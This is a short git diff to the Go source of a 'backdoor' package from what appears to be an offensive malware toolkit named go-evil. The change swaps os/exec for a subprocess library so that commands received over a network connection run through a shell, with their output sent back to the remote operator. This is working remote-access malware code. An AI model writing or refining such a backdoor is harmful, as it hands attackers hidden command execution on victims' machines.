@@ -2,12 +2,12 @@ package backdoor
 
 import (
 	"net"
-	"os/exec"
 	"strings"
 
 	attack_vector "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private"
 	"github.com/s9rA16Bf4/go-evil/utility/converter"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
 type backdoor_t struct {
@@ -168,14 +168,16 @@ func Serve() {
 		if command == "" { // Nothing was most likely entered
 			toReturn = append(toReturn, []byte("No command was entered\n")...)
 		} else {
+			var resp subprocess.Response
 			if args != "" {
-				toReturn, err = exec.Command(command, strings.Split(args, " ")...).Output()
+				resp = subprocess.RunShell("", "", strings.Split(command+" "+args, " ")...)
 			} else {
-				toReturn, err = exec.Command(command).Output()
+				resp = subprocess.RunShell("", "", command)
 			}
-			if err != nil {
-				toReturn = append(toReturn, []byte(err.Error())...)
-				toReturn = append(toReturn, []byte("\n")...)
+			if resp.StdErr != "" {
+				toReturn = []byte(resp.StdErr)
+			} else {
+				toReturn = []byte(resp.StdOut)
 			}
 		}
 		active_conn.Write([]byte(toReturn)) // Send the output back to the user
